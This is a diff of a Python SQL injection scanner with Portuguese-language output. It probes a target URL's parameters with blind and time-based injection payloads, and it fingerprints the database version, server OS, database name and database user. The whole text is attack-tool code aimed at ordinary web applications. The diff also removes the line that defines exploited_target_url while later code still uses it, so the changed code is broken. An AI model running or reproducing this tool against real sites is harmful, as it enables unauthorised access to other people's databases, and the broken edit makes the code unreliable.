@@ -35,14 +35,14 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
             from core.utils import urlExplode
             from mode.plugin.dbfingerprint import _dbFingerprint
             from mode.plugin.dbfingerprint import _serverVersion
-            from mode.plugin.dbfingerprint import _getDatabaseName
+            from mode.plugin.dbfingerprint import _getDatabaseNameU
             
             import re
             import requests
             
             
             print("["+color.green+"!"+color.end+"]"+color.end+" Modo de"+color.orange+" deteção injeção sql"+ color.end+" passada para o alvo "+color.orange+target_url+color.end)
-            print("["+color.green+"+"+color.end+"] Testando a estabilidade da conexão, pode levar alguns minutos...")
+            print("["+color.green+"~"+color.end+"] Testando a estabilidade da conexão, pode levar alguns minutos...")
             
             if(avaregeTime(target_url) >= AVARAGE_TIME_BASED_SQLI):
                 print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" A sua conexão parece estar instável, recomenda-se que se tenha uma conexão estável."+color.end, end='')
@@ -63,7 +63,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                 
             ## filtrando a variável url id do alvo passado
             try:
-                print("["+color.green+"+"+color.end+"] Procurando por variáveis URL...", end='') 
+                print("["+color.green+"~"+color.end+"] Procurando por variáveis URL...", end='') 
                 para = re.compile('(=)\w+')
                 if para.search(target_url):
                         try:
@@ -77,16 +77,16 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                 fazendo um fingerprint no servidor
                             '''
                             
-                            print("\n["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) ORDER QUERY TECHNIQUE, pode levar alguns minutos dependendo da Lactência da Rede.."+color.end)
+                            print("\n["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) ORDER QUERY TECHNIQUE, pode levar alguns minutos dependendo da Lactência da Rede.."+color.end)
                             current_table_cullumns_number = _dbFingerprint(target_url)
                             
-                            print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) FINGERPRINT TECHINQUE, pode levar alguns minutos dependendo da Lactência da Rede.."+color.end, end='')
+                            print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) FINGERPRINT TECHINQUE, pode levar alguns minutos dependendo da Lactência da Rede.."+color.end)
                             server_fingerprint = _serverVersion(target_url, current_table_cullumns_number)
                             
-                            _getDatabaseName(target_url, current_table_cullumns_number)
-
-                           
-                            print("\n["+color.green+"+"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
+                            print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) DATABASE USER FINGERPRINT TECHINQUE..."+color.end)
+                            database_user_fingerprint = _getDatabaseNameU(target_url, current_table_cullumns_number)
+                                                       
+                            print("["+color.green+"~"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
                             if 'mysql' in requesicao.text.lower():
                                 ## mostra o relatório em relação ao fingerprint do servidor
                                 print("\n ----------")
@@ -100,23 +100,23 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                 print("\tSGBD alvo: MYSQL")        
                                 print("\tVersão do SGBD: %s" %server_fingerprint[1])
                                 print("\tSistema backend (OS) do SGBD: %s" %server_fingerprint[2])
-                                print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
+                                print("\tNome do usuário do banco de dados: %s" %database_user_fingerprint[2])
+                                print("\tNome do banco de dados: %s" %database_user_fingerprint[1])
+#                               print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
                                 print(" ----------")
                                 ## termino do relatório
-                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
+                                print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                 with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
                                     for lines in blind_time_based_sqli:
-                                        print("["+color.end+"*"+color.end+"] [Testando]  MYSQLi "+color.cian+lines+color.end, end='')
-                                        exploited_target_url = target_url.replace(splited_para, "="+lines)
                                         response_time = int(avaregeTime(exploited_target_url))
                                         if avaregeTime(exploited_target_url) >= DEFAULT_SQLI_TIME_BASED_TIME:
                                             print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]    MYSQLi"+ color.cian, lines+color.end, end='')
                                         else:
                                             print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
-                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
+                                print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
         
                             elif 'native client' in requesicao.text.lower():
-                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[MSSQL]")
+                                print("["+color.green+"~"+color.end+"] SGBD identificado: "+color.cian+"[MSSQL]")
                                 print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MSSQL inferencial(CEGA) baseada no tempo"+color.end)
                                 with open("./mode/payload/mssql/blind_payloads_time_based" , 'r') as blind_payloads_time_based:
                                     for lines in blind_payloads_time_based:
@@ -129,8 +129,8 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                             print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
                                             
                             elif 'syntax error' in requesicao.text.lower():
-                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[POSTGRES]")
-                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" POSTGRES inferencial(CEGA) baseada no tempo"+color.end)
+                                print("["+color.green+"+"+color.end+"] SGBD identificado: "+color.cian+"[POSTGRES]")
+                                print("["+color.green+"~"+color.end+"] Testando "+color.cian+" POSTGRES inferencial(CEGA) baseada no tempo"+color.end)
                                 '''
                                 ainda sem os payload ideias pra o postgres server
                                 '''
